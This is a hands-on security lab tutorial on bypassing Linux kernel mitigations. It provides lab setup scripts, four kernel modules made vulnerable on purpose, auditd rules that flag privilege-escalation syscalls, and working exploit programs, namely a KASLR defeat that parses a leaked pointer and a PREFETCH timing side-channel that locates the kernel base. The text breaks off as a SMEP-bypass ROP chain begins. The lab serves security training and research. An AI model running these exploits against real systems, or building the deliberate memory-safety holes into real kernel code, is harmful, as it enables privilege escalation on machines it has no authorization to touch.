# Tutorial: Kernel Mitigation Bypass and Combined Exploit Primitive Chains — Hands-On Lab

> **Prerequisite knowledge.** Domain 6, Chapter 6A (userspace mitigation bypass). Domain 5 (kernel exploitation). Domain 2 (kernel address space, syscall dispatch, seccomp). Domain 4B (hardware-enforced CFI). This lab assumes KASLR/SMEP/SMAP/KPTI conceptual understanding; exercises build from first principles to full exploit chains.

> **Authorization context.** All exercises target isolated VMs under your control. Kernel exploitation techniques documented here are for authorized security research, penetration testing engagements, CTF competitions, and defensive security engineering. Never apply these techniques against systems without explicit written authorization.

---

## Lab Environment Setup

### Hardware Requirements

| Resource | Minimum | Recommended |
|----------|---------|-------------|
| CPU | x86_64, 4 cores, VT-x/AMD-V | 8+ cores, Intel 12th-gen+ (for CET labs) |
| RAM | 16 GB | 32 GB |
| Disk | 80 GB free | 150 GB SSD |
| Nested virt | Required | — |

### VM Topology

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         HOST (hypervisor)                                 │
│                                                                          │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────────┐  │
│  │  kernel-dev       │  │  kernel-target    │  │  kernel-detect        │  │
│  │  Ubuntu 22.04     │  │  Custom kernels   │  │  Ubuntu 22.04         │  │
│  │  Exploit dev +    │  │  Multiple builds  │  │  LKRG + Tetragon +   │  │
│  │  cross-compile    │  │  (vuln + hardened) │  │  Falco + auditd      │  │
│  │  ROPgadget, GDB   │  │  QEMU/KVM nested  │  │  eBPF monitoring     │  │
│  │  192.168.56.10    │  │  192.168.56.11    │  │  192.168.56.12       │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────────┘  │
│                                                                          │
│  Network: vboxnet0 / virbr-lab (192.168.56.0/24, isolated)              │
└─────────────────────────────────────────────────────────────────────────┘
```

### Installation Script

```bash
#!/bin/bash
# kernel_bypass_lab_setup.sh — Full lab environment provisioning
# Run on each VM as root. Argument: role (dev|target|detect)

set -euo pipefail
ROLE="${1:-dev}"

echo "[*] Kernel Mitigation Bypass Lab — Setup for role: $ROLE"

# Common packages
apt-get update && apt-get install -y \
    build-essential gcc g++ make cmake git curl wget \
    linux-headers-$(uname -r) \
    libelf-dev libdw-dev libaudit-dev libslang2-dev \
    binutils-dev libiberty-dev libcap-dev \
    flex bison pkg-config libssl-dev bc \
    python3 python3-pip python3-venv \
    nasm qemu-system-x86 qemu-utils \
    strace ltrace gdb \
    auditd audispd-plugins \
    jq tmux

pip3 install --break-system-packages pwntools ropper keystone-engine capstone unicorn

case "$ROLE" in
dev)
    echo "[*] Installing exploit development tools..."

    # ROPgadget
    pip3 install --break-system-packages ROPgadget

    # GEF (GDB Enhanced Features)
    bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

    # Kernel source for gadget extraction
    apt-get install -y linux-source
    mkdir -p /opt/kernels
    tar -xf /usr/src/linux-source-*.tar.bz2 -C /opt/kernels/ 2>/dev/null || true

    # pwndbg as alternative
    git clone https://github.com/pwndbg/pwndbg /opt/pwndbg
    cd /opt/pwndbg && ./setup.sh

    # Kernel exploit helper scripts
    mkdir -p /opt/exploit-tools
    cat > /opt/exploit-tools/find_gadgets.sh << 'GADGETEOF'
#!/bin/bash
# Extract ROP gadgets from vmlinux
VMLINUX="${1:-/boot/vmlinux-$(uname -r)}"
if [ ! -f "$VMLINUX" ]; then
    # Try extracting from compressed kernel
    VMLINUZ="/boot/vmlinuz-$(uname -r)"
    /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux "$VMLINUZ" > /tmp/vmlinux 2>/dev/null
    VMLINUX="/tmp/vmlinux"
fi
echo "[*] Extracting gadgets from: $VMLINUX"
ROPgadget --binary "$VMLINUX" --multibr > /tmp/gadgets_full.txt
echo "[+] Full gadget list: /tmp/gadgets_full.txt ($(wc -l < /tmp/gadgets_full.txt) gadgets)"
# Extract commonly needed gadgets
grep "pop rdi ; ret" /tmp/gadgets_full.txt | head -5 > /tmp/gadgets_useful.txt
grep "pop rsi ; ret" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "pop rdx ; ret" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "pop rcx ; ret" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "mov rdi, rax" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "xchg.*rsp" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "swapgs" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
grep "iretq" /tmp/gadgets_full.txt | head -5 >> /tmp/gadgets_useful.txt
echo "[+] Key gadgets: /tmp/gadgets_useful.txt"
GADGETEOF
    chmod +x /opt/exploit-tools/find_gadgets.sh

    # Custom kernel build script (builds vulnerable kernels for lab)
    cat > /opt/exploit-tools/build_vuln_kernel.sh << 'BUILDEOF'
#!/bin/bash
# Build a kernel with specific mitigations enabled/disabled for lab exercises
# Usage: ./build_vuln_kernel.sh <profile>
# Profiles: bare (no mitigations), partial (KASLR+SMEP only), full (all mitigations)
PROFILE="${1:-bare}"
KERNEL_SRC="/opt/kernels/linux-source-*"
KERNEL_DIR=$(ls -d $KERNEL_SRC 2>/dev/null | head -1)
if [ -z "$KERNEL_DIR" ]; then
    echo "[-] No kernel source found in /opt/kernels/"
    exit 1
fi
cd "$KERNEL_DIR"
make defconfig
case "$PROFILE" in
bare)
    # Minimal mitigations — for learning fundamental techniques
    scripts/config --disable CONFIG_RANDOMIZE_BASE       # No KASLR
    scripts/config --disable CONFIG_PAGE_TABLE_ISOLATION  # No KPTI
    scripts/config --disable CONFIG_STACKPROTECTOR_STRONG
    scripts/config --disable CONFIG_SLAB_FREELIST_HARDENED
    scripts/config --set-val CONFIG_DEFAULT_MMAP_MIN_ADDR 0
    scripts/config --disable CONFIG_HARDENED_USERCOPY
    echo "[*] Profile: bare — no kernel mitigations"
    ;;
partial)
    # KASLR + SMEP only (CR4.SMEP set at boot, but no SMAP/KPTI)
    scripts/config --enable CONFIG_RANDOMIZE_BASE
    scripts/config --disable CONFIG_PAGE_TABLE_ISOLATION
    scripts/config --disable CONFIG_SLAB_FREELIST_HARDENED
    scripts/config --enable CONFIG_STACKPROTECTOR_STRONG
    echo "[*] Profile: partial — KASLR + SMEP + stack canary"
    ;;
full)
    # Full mitigations (modern production-like)
    scripts/config --enable CONFIG_RANDOMIZE_BASE
    scripts/config --enable CONFIG_PAGE_TABLE_ISOLATION
    scripts/config --enable CONFIG_SLAB_FREELIST_HARDENED
    scripts/config --enable CONFIG_SLAB_FREELIST_RANDOM
    scripts/config --enable CONFIG_HARDENED_USERCOPY
    scripts/config --enable CONFIG_FORTIFY_SOURCE
    scripts/config --enable CONFIG_STACKPROTECTOR_STRONG
    scripts/config --enable CONFIG_INIT_ON_ALLOC_DEFAULT_ON
    scripts/config --enable CONFIG_INIT_ON_FREE_DEFAULT_ON
    scripts/config --enable CONFIG_LIST_HARDENED
    scripts/config --enable CONFIG_BUG_ON_DATA_CORRUPTION
    scripts/config --enable CONFIG_SHUFFLE_PAGE_ALLOCATOR
    echo "[*] Profile: full — all kernel mitigations"
    ;;
esac
# Common: enable debug info for gadget analysis
scripts/config --enable CONFIG_DEBUG_INFO
scripts/config --enable CONFIG_DEBUG_INFO_DWARF5
scripts/config --enable CONFIG_PROC_KCORE
scripts/config --enable CONFIG_SLUB_DEBUG
make olddefconfig
make -j$(nproc) bzImage modules
echo "[+] Kernel built: arch/x86/boot/bzImage"
echo "[+] Boot with: qemu-system-x86_64 -kernel arch/x86/boot/bzImage ..."
BUILDEOF
    chmod +x /opt/exploit-tools/build_vuln_kernel.sh
    ;;

target)
    echo "[*] Setting up target kernel environment..."

    # QEMU for booting custom kernels
    apt-get install -y qemu-system-x86 debootstrap

    # Create minimal rootfs for QEMU
    mkdir -p /opt/rootfs
    debootstrap --include=bash,coreutils,util-linux,strace,gcc,make \
        jammy /opt/rootfs http://archive.ubuntu.com/ubuntu/ || true

    # Create init script for QEMU rootfs
    cat > /opt/rootfs/init << 'INITEOF'
#!/bin/bash
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs tmpfs /tmp
# Expose kernel addresses for lab (non-production!)
echo 0 > /proc/sys/kernel/kptr_restrict
echo 0 > /proc/sys/kernel/dmesg_restrict
# Run shell
exec /bin/bash
INITEOF
    chmod +x /opt/rootfs/init

    # Pack rootfs into initramfs
    cd /opt/rootfs
    find . | cpio -o --format=newc | gzip > /opt/rootfs.cpio.gz
    echo "[+] Root filesystem: /opt/rootfs.cpio.gz"

    # QEMU launch script
    cat > /opt/launch_kernel.sh << 'QEMUEOF'
#!/bin/bash
# Launch custom kernel in QEMU for exploitation testing
KERNEL="${1:-/opt/kernels/bzImage}"
ROOTFS="${2:-/opt/rootfs.cpio.gz}"
APPEND="console=ttyS0 nokaslr nosmap nosmep nopti oops=panic"
# Add mitigations based on profile:
# nokaslr nosmap nosmep nopti = bare profile
# Remove 'nokaslr' for KASLR exercises
# Remove all 'no*' for full-mitigation exercises
qemu-system-x86_64 \
    -kernel "$KERNEL" \
    -initrd "$ROOTFS" \
    -append "$APPEND" \
    -m 2G \
    -smp 2 \
    -nographic \
    -monitor /dev/null \
    -enable-kvm \
    -cpu host \
    -net nic -net user,hostfwd=tcp::2222-:22 \
    -s  # GDB server on port 1234
QEMUEOF
    chmod +x /opt/launch_kernel.sh
    ;;

detect)
    echo "[*] Installing detection infrastructure..."

    # LKRG (Linux Kernel Runtime Guard)
    git clone https://github.com/lkrg-org/lkrg.git /opt/lkrg
    cd /opt/lkrg && make -j$(nproc) || echo "[!] LKRG build requires matching headers"

    # Tetragon (Cilium eBPF security observability)
    curl -fsSL https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz \
        | tar -xz -C /opt/
    ln -sf /opt/tetragon /usr/local/bin/tetragon 2>/dev/null || true

    # Falco
    curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
        gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" \
        > /etc/apt/sources.list.d/falcosecurity.list
    apt-get update && apt-get install -y falco || echo "[!] Falco install may need kernel headers"

    # bpftool and libbpf
    apt-get install -y linux-tools-$(uname -r) linux-tools-common bpftrace

    # auditd hardened configuration
    cat > /etc/audit/rules.d/90-kernel-exploit.rules << 'AUDITEOF'
# Kernel exploitation detection rules
-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -F a0=0 -F auid!=0 -F key=priv_esc_monitor
-a always,exit -F arch=b64 -S setgid -S setregid -S setresgid -F a0=0 -F auid!=0 -F key=priv_esc_monitor
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -F key=kernel_module_ops
-a always,exit -F arch=b64 -S kexec_load -S kexec_file_load -F key=kexec_attempt
-a always,exit -F arch=b64 -S ptrace -F a0=0x4 -F key=ptrace_inject
-a always,exit -F arch=b64 -S splice -S tee -F key=splice_monitor
-a always,exit -F arch=b64 -S userfaultfd -F key=userfaultfd_create
-a always,exit -F arch=b64 -S unshare -F key=namespace_ops
-a always,exit -F arch=b64 -S bpf -F key=bpf_ops
-a always,exit -F arch=b64 -S perf_event_open -F key=perf_event_monitor
-a always,exit -F arch=b64 -S io_uring_setup -S io_uring_enter -S io_uring_register -F key=io_uring_ops
-w /proc/sys/kernel/core_pattern -p wa -k core_pattern_modify
-w /proc/sys/kernel/modprobe -p wa -k modprobe_path_modify
-w /dev/mem -p rw -k devmem_access
-w /dev/kmem -p rw -k devkmem_access
AUDITEOF
    augenrules --load
    systemctl restart auditd

    echo "[+] Detection stack deployed"
    ;;
esac

echo "[+] Setup complete for role: $ROLE"
```

### Vulnerable Kernel Modules for Lab Exercises

Save the following modules to `/opt/exploit-tools/vuln_modules/` on the `kernel-dev` VM. These provide controlled vulnerability primitives for each exercise.

**Module 1: Stack buffer overflow (basic kernel ROP)**

```c
/* vuln_stack_overflow.c — Kernel module with controllable stack overflow.
 * Provides /proc/vuln_stack for triggering overflow via write().
 * Compile: make -C /lib/modules/$(uname -r)/build M=$PWD modules */

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Lab: Stack buffer overflow for kernel ROP exercise");

static ssize_t vuln_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
    char local_buf[64];  /* Fixed-size buffer — overflow target */

    /* BUG: no bounds check on count */
    if (copy_from_user(local_buf, buf, count))
        return -EFAULT;

    pr_info("vuln_stack: received %zu bytes\n", count);
    return count;
}

static const struct proc_ops vuln_stack_ops = {
    .proc_write = vuln_write,
};

static int __init vuln_stack_init(void)
{
    proc_create("vuln_stack", 0666, NULL, &vuln_stack_ops);
    pr_info("vuln_stack: loaded (/proc/vuln_stack)\n");
    return 0;
}

static void __exit vuln_stack_exit(void)
{
    remove_proc_entry("vuln_stack", NULL);
    pr_info("vuln_stack: unloaded\n");
}

module_init(vuln_stack_init);
module_exit(vuln_stack_exit);
```

**Module 2: Use-after-free (cross-cache exercise)**

```c
/* vuln_uaf.c — Kernel module with controllable UAF.
 * Provides /proc/vuln_uaf with ioctl interface:
 *   ALLOC (0x1001): allocate object
 *   FREE  (0x1002): free object (UAF — reference retained)
 *   READ  (0x1003): read via dangling pointer
 *   WRITE (0x1004): write via dangling pointer */

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Lab: UAF for cross-cache exploitation exercise");

#define VULN_ALLOC  _IO('V', 1)
#define VULN_FREE   _IO('V', 2)
#define VULN_READ   _IOR('V', 3, char[256])
#define VULN_WRITE  _IOW('V', 4, char[256])

#define OBJ_SIZE 256

static struct kmem_cache *vuln_cache;
static void *vuln_obj = NULL;  /* Dangling pointer after free */

static long vuln_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char user_buf[OBJ_SIZE];

    switch (cmd) {
    case VULN_ALLOC:
        if (vuln_obj) {
            pr_warn("vuln_uaf: object already allocated\n");
            return -EEXIST;
        }
        vuln_obj = kmem_cache_alloc(vuln_cache, GFP_KERNEL);
        if (!vuln_obj) return -ENOMEM;
        memset(vuln_obj, 0, OBJ_SIZE);
        pr_info("vuln_uaf: allocated at %px\n", vuln_obj);
        return 0;

    case VULN_FREE:
        if (!vuln_obj) return -ENOENT;
        kmem_cache_free(vuln_cache, vuln_obj);
        /* BUG: vuln_obj is NOT nullified — dangling pointer */
        pr_info("vuln_uaf: freed (dangling pointer retained)\n");
        return 0;

    case VULN_READ:
        if (!vuln_obj) return -ENOENT;
        /* BUG: reads from potentially freed/reallocated memory */
        if (copy_to_user((void __user *)arg, vuln_obj, OBJ_SIZE))
            return -EFAULT;
        return 0;

    case VULN_WRITE:
        if (!vuln_obj) return -ENOENT;
        if (copy_from_user(user_buf, (void __user *)arg, OBJ_SIZE))
            return -EFAULT;
        /* BUG: writes to potentially freed/reallocated memory */
        memcpy(vuln_obj, user_buf, OBJ_SIZE);
        return 0;

    default:
        return -EINVAL;
    }
}

static const struct proc_ops vuln_uaf_ops = {
    .proc_ioctl = vuln_ioctl,
};

static int __init vuln_uaf_init(void)
{
    vuln_cache = kmem_cache_create("vuln_uaf_cache", OBJ_SIZE, 0,
                                    SLAB_HWCACHE_ALIGN, NULL);
    if (!vuln_cache) return -ENOMEM;
    proc_create("vuln_uaf", 0666, NULL, &vuln_uaf_ops);
    pr_info("vuln_uaf: loaded (obj_size=%d)\n", OBJ_SIZE);
    return 0;
}

static void __exit vuln_uaf_exit(void)
{
    remove_proc_entry("vuln_uaf", NULL);
    if (vuln_obj) kmem_cache_free(vuln_cache, vuln_obj);
    kmem_cache_destroy(vuln_cache);
}

module_init(vuln_uaf_init);
module_exit(vuln_uaf_exit);
```

**Module 3: Arbitrary kernel write (for modprobe_path/cred exercises)**

```c
/* vuln_arbwrite.c — Kernel module providing arbitrary write primitive.
 * Simulates the endpoint of a real exploit chain.
 * Provides /proc/vuln_arbwrite: write "addr:value" to trigger. */

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Lab: Arbitrary kernel write for privilege escalation exercises");

static ssize_t vuln_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
    char input[128];
    unsigned long addr, value;
    size_t write_size;

    if (count >= sizeof(input)) return -EINVAL;
    if (copy_from_user(input, buf, count)) return -EFAULT;
    input[count] = '\0';

    /* Parse: "addr value size" (hex hex decimal) */
    if (sscanf(input, "%lx %lx %zu", &addr, &value, &write_size) != 3)
        return -EINVAL;

    if (write_size > 8) write_size = 8;

    /* BUG: Arbitrary kernel write — no validation of addr */
    pr_info("vuln_arbwrite: writing %#lx (%zu bytes) to %#lx\n",
            value, write_size, addr);
    memcpy((void *)addr, &value, write_size);

    return count;
}

/* String write variant: "S:addr:string" */
static ssize_t vuln_write_str(struct file *file, const char __user *buf,
                              size_t count, loff_t *ppos)
{
    char input[256];
    unsigned long addr;
    char *str_start;

    if (count >= sizeof(input)) return -EINVAL;
    if (copy_from_user(input, buf, count)) return -EFAULT;
    input[count] = '\0';

    if (input[0] == 'S' && input[1] == ':') {
        /* String write mode */
        addr = simple_strtoul(input + 2, &str_start, 16);
        if (*str_start == ':') str_start++;
        pr_info("vuln_arbwrite: string write '%s' to %#lx\n", str_start, addr);
        strncpy((char *)addr, str_start, 255);
        return count;
    }

    return vuln_write(file, buf, count, ppos);
}

static const struct proc_ops vuln_arbwrite_ops = {
    .proc_write = vuln_write_str,
};

static int __init vuln_arbwrite_init(void)
{
    proc_create("vuln_arbwrite", 0666, NULL, &vuln_arbwrite_ops);
    pr_info("vuln_arbwrite: loaded\n");
    return 0;
}

static void __exit vuln_arbwrite_exit(void)
{
    remove_proc_entry("vuln_arbwrite", NULL);
}

module_init(vuln_arbwrite_init);
module_exit(vuln_arbwrite_exit);
```

**Module 4: Information leak (KASLR bypass exercise)**

```c
/* vuln_infoleak.c — Kernel module that leaks kernel pointers.
 * Simulates kptr_restrict bypass and uninitialized stack/heap leaks.
 * /proc/vuln_leak: read returns kernel text pointer (simulated). */

#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Lab: Kernel information leak for KASLR bypass exercise");

static ssize_t vuln_read(struct file *file, char __user *buf,
                         size_t count, loff_t *ppos)
{
    char output[256];
    int len;
    unsigned long leaked_ptr;

    /* BUG: Leaks kernel text pointer via unprotected proc output.
     * In real exploits, this would be an uninitialized struct field,
     * a %p format string in dmesg, or an IOCTL output buffer. */
    leaked_ptr = (unsigned long)vuln_read;  /* Leak our own function address */

    len = snprintf(output, sizeof(output),
                   "leaked_kptr: 0x%lx\n"
                   "commit_creds: 0x%px\n"
                   "prepare_kernel_cred: 0x%px\n",
                   leaked_ptr,
                   (void *)kallsyms_lookup_name("commit_creds"),
                   (void *)kallsyms_lookup_name("prepare_kernel_cred"));

    if (*ppos >= len) return 0;
    if (count > len - *ppos) count = len - *ppos;
    if (copy_to_user(buf, output + *ppos, count)) return -EFAULT;
    *ppos += count;
    return count;
}

static const struct proc_ops vuln_leak_ops = {
    .proc_read = vuln_read,
};

static int __init vuln_leak_init(void)
{
    proc_create("vuln_leak", 0444, NULL, &vuln_leak_ops);
    pr_info("vuln_infoleak: loaded (/proc/vuln_leak)\n");
    return 0;
}

static void __exit vuln_leak_exit(void)
{
    remove_proc_entry("vuln_leak", NULL);
}

module_init(vuln_leak_init);
module_exit(vuln_leak_exit);
```

**Makefile for all modules:**

```makefile
# /opt/exploit-tools/vuln_modules/Makefile
obj-m += vuln_stack_overflow.o
obj-m += vuln_uaf.o
obj-m += vuln_arbwrite.o
obj-m += vuln_infoleak.o

KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

install:
	insmod vuln_stack_overflow.ko
	insmod vuln_uaf.ko
	insmod vuln_arbwrite.ko
	insmod vuln_infoleak.ko
	@echo "[+] All vulnerable modules loaded"

uninstall:
	rmmod vuln_infoleak 2>/dev/null || true
	rmmod vuln_arbwrite 2>/dev/null || true
	rmmod vuln_uaf 2>/dev/null || true
	rmmod vuln_stack_overflow 2>/dev/null || true
	@echo "[+] All vulnerable modules unloaded"
```

---

## PART A: OFFENSIVE — Kernel Mitigation Bypass Exercises

### Exercise 1: KASLR Bypass via Information Leak

**Objective:** Defeat kernel ASLR by extracting kernel text pointers through various leak channels. Understand the 9-bit entropy limitation and compute the kernel base from a single leaked pointer.

**Step 1 — Understanding KASLR entropy:**

```bash
# On kernel-target VM (booted with KASLR enabled):
# Verify KASLR is active
cat /proc/cmdline | grep -o "nokaslr" || echo "KASLR is enabled"

# Observe the randomization (requires root for kptr_restrict=0):
cat /proc/kallsyms | grep " T _text"
# Each boot produces a different address, e.g.: ffffffff9f000000 T _text

# Calculate entropy: kernel text base is 2MB-aligned within 1GB window
# 1 GB / 2 MB = 512 positions = 9 bits of entropy
python3 -c "
import math
window_bytes = 1 * 1024 * 1024 * 1024  # 1 GB
alignment = 2 * 1024 * 1024             # 2 MB
positions = window_bytes // alignment
entropy_bits = math.log2(positions)
print(f'KASLR entropy: {entropy_bits:.1f} bits ({positions} positions)')
print(f'Brute-force attempts for 50% success: {positions // 2}')
"
```

**Step 2 — Information leak via vulnerable module:**

```c
/* kaslr_defeat.c — Exploit KASLR using the vuln_infoleak module.
 * Demonstrates how a single kernel pointer leak defeats KASLR. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

/* Known offsets from vmlinux (extract with: nm vmlinux | grep <symbol>)
 * These are STATIC offsets within the kernel image — they don't change
 * between boots, only the base address changes. */
struct kernel_offsets {
    unsigned long commit_creds;
    unsigned long prepare_kernel_cred;
    unsigned long modprobe_path;
    unsigned long swapgs_restore;
    unsigned long init_cred;
    unsigned long selinux_enforcing;
};

/* Extract offsets from vmlinux or System.map:
 * nm /boot/vmlinux-$(uname -r) | grep -w commit_creds
 * or: grep -w commit_creds /boot/System.map-$(uname -r) */
static struct kernel_offsets offsets_6_5 = {
    .commit_creds       = 0x0bba90,   /* example: adjust per kernel */
    .prepare_kernel_cred = 0x0bbe40,
    .modprobe_path      = 0x1844740,
    .swapgs_restore     = 0x1000f26,
    .init_cred          = 0x1e544c0,
    .selinux_enforcing  = 0x1e56a00,
};

unsigned long leak_kernel_pointer(void)
{
    int fd = open("/proc/vuln_leak", O_RDONLY);
    if (fd < 0) {
        perror("open /proc/vuln_leak");
        return 0;
    }

    char buf[512];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    unsigned long ptr = 0;
    /* Parse the leaked pointer */
    char *p = strstr(buf, "leaked_kptr: 0x");
    if (p) {
        sscanf(p, "leaked_kptr: 0x%lx", &ptr);
    }
    return ptr;
}

unsigned long compute_kernel_base(unsigned long leaked_ptr,
                                   unsigned long known_offset)
{
    /* The leaked pointer = kernel_base + known_offset_of_leaked_function.
     * We know which function was leaked, so we know its offset.
     * kernel_base = leaked_ptr - offset
     *
     * But we need to know which function the leak came from.
     * In this lab: vuln_read is in the module, not vmlinux.
     * The commit_creds pointer is directly leaked. */
    return leaked_ptr;  /* Direct leak — no offset calculation needed */
}

int main(void)
{
    printf("[*] KASLR Bypass via Information Leak\n");
    printf("[*] Reading /proc/vuln_leak...\n");

    unsigned long leaked = leak_kernel_pointer();
    if (!leaked) {
        printf("[-] Failed to leak kernel pointer\n");
        return 1;
    }

    printf("[+] Leaked kernel pointer: 0x%lx\n", leaked);

    /* Compute base from leaked commit_creds address */
    unsigned long kbase = leaked - offsets_6_5.commit_creds;
    /* Verify alignment (must be 2MB-aligned for KASLR) */
    if (kbase & 0x1fffff) {
        printf("[!] Base not 2MB-aligned, adjusting...\n");
        kbase &= ~0x1fffffUL;
    }

    printf("[+] Computed kernel base: 0x%lx\n", kbase);
    printf("[+] commit_creds:         0x%lx\n", kbase + offsets_6_5.commit_creds);
    printf("[+] prepare_kernel_cred:  0x%lx\n", kbase + offsets_6_5.prepare_kernel_cred);
    printf("[+] modprobe_path:        0x%lx\n", kbase + offsets_6_5.modprobe_path);
    printf("[+] swapgs_restore:       0x%lx\n", kbase + offsets_6_5.swapgs_restore);
    printf("[+] init_cred:            0x%lx\n", kbase + offsets_6_5.init_cred);

    return 0;
}
```

**Step 3 — Prefetch-based KASLR probing (without KPTI):**

```c
/* prefetch_kaslr.c — KASLR bypass via PREFETCH timing side-channel.
 * Only works when KPTI is DISABLED (boot with 'nopti').
 * The kernel page-table entries remain in user page table without KPTI,
 * so PREFETCH reveals which addresses have valid PTEs. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <sys/mman.h>

#define KASLR_WINDOW_START  0xffffffff80000000UL
#define KASLR_WINDOW_END    0xffffffffc0000000UL  /* 1 GB window */
#define KASLR_ALIGNMENT     0x200000UL            /* 2 MB aligned */
#define THRESHOLD           100                    /* Timing threshold (cycles) */
#define SAMPLES             1000                   /* Measurements per probe */

static inline uint64_t rdtsc_begin(void)
{
    unsigned int aux;
    return __rdtscp(&aux);
}

static inline uint64_t rdtsc_end(void)
{
    unsigned int aux;
    uint64_t tsc = __rdtscp(&aux);
    _mm_lfence();
    return tsc;
}

/* Measure PREFETCH timing for a given address.
 * Mapped addresses (valid PTE) produce faster PREFETCH due to
 * successful page-table walk, even if the page is supervisor-only. */
static uint64_t measure_prefetch(unsigned long addr)
{
    uint64_t total = 0;

    for (int i = 0; i < SAMPLES; i++) {
        _mm_mfence();
        _mm_clflush((void *)addr);  /* Flush to force re-walk */
        _mm_mfence();

        uint64_t t1 = rdtsc_begin();
        _mm_prefetch((void *)addr, _MM_HINT_T0);
        uint64_t t2 = rdtsc_end();

        total += (t2 - t1);
    }
    return total / SAMPLES;
}

int main(void)
{
    printf("[*] Prefetch-based KASLR bypass\n");
    printf("[*] NOTE: Only works with KPTI disabled (nopti boot parameter)\n");
    printf("[*] Scanning %lu candidate positions...\n",
           (KASLR_WINDOW_END - KASLR_WINDOW_START) / KASLR_ALIGNMENT);

    uint64_t min_time = UINT64_MAX;
    unsigned long found_base = 0;

    for (unsigned long addr = KASLR_WINDOW_START;
         addr < KASLR_WINDOW_END;
         addr += KASLR_ALIGNMENT) {

        uint64_t timing = measure_prefetch(addr);

        if (timing < min_time) {
            min_time = timing;
            found_base = addr;
        }

        /* Report progress every 64 probes */
        if (((addr - KASLR_WINDOW_START) / KASLR_ALIGNMENT) % 64 == 0) {
            printf("\r[*] Progress: %lu / %lu (current best: 0x%lx, %lu cycles)",
                   (addr - KASLR_WINDOW_START) / KASLR_ALIGNMENT,
                   (KASLR_WINDOW_END - KASLR_WINDOW_START) / KASLR_ALIGNMENT,
                   found_base, min_time);
            fflush(stdout);
        }
    }

    printf("\n[+] Detected kernel base: 0x%lx (timing: %lu cycles)\n",
           found_base, min_time);
    printf("[*] Verify: cat /proc/kallsyms | grep ' T _text'\n");

    return 0;
}
```

**Expected output:**
```
[*] Prefetch-based KASLR bypass
[*] NOTE: Only works with KPTI disabled (nopti boot parameter)
[*] Scanning 512 candidate positions...
[+] Detected kernel base: 0xffffffff9f000000 (timing: 42 cycles)
[*] Verify: cat /proc/kallsyms | grep ' T _text'
```

**Verification:**
```bash
# Compare with actual base (requires root):
actual=$(cat /proc/kallsyms | grep " T _text" | awk '{print "0x"$1}')
echo "Actual: $actual"
echo "Detected: 0x$(printf '%x' $found_base)"
```

---

### Exercise 2: SMEP Bypass via Kernel ROP (CR4 Bit Clearing)

**Objective:** Construct a kernel ROP chain that disables SMEP by clearing CR4 bit 20, then redirect execution to user-space shellcode. Understand why modern kernels pin CR4 and how CET makes this obsolete.

**Step 1 — Understand the target:**

```bash
# Check current CR4 value (bit 20 = SMEP, bit 21 = SMAP):
# On running system, read via /proc or GDB:
cat /proc/cpuinfo | grep -o "smep\|smap\|umip"
# Expected: smep smap umip

# In GDB attached to QEMU kernel:
# (gdb) monitor info registers
# Look for CR4 value, e.g., cr4=0x003726f0
# Bit 20 (0x100000) = SMEP, Bit 21 (0x200000) = SMAP
python3 -c "
cr4 = 0x003726f0
print(f'CR4 = {cr4:#x}')
print(f'SMEP (bit 20): {bool(cr4 & (1 << 20))}')
print(f'SMAP (bit 21): {bool(cr4 & (1 << 21))}')
print(f'CR4 with SMEP cleared: {cr4 & ~(1 << 20):#x}')
print(f'CR4 with SMEP+SMAP cleared: {cr4 & ~(3 << 20):#x}')
"
```

**Step 2 — Find the `native_write_cr4` gadget:**

```bash
# Extract gadgets from vmlinux:
ROPgadget --binary /tmp/vmlinux | grep "mov cr4"
# Look for: mov cr4, rdi ; ret  (or similar)

# Find native_write_cr4 address:
grep -w native_write_cr4 /proc/kallsyms
# Example: ffffffff81074e50 T native_write_cr4

# Find pop rdi; ret gadget:
ROPgadget --binary /tmp/vmlinux | grep "pop rdi ; ret" | head -3
```

**Step 3 — Build the SMEP-bypass ROP chain:**

```c
/* smep_bypass_rop.c — Kernel ROP chain to disable SMEP and execute user shellcode.
 * Target: kernel WITHOUT CR4 pinning (pre-5.3 or with pinning disabled).
 * Uses vuln_stack_overflow module as the trigger. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
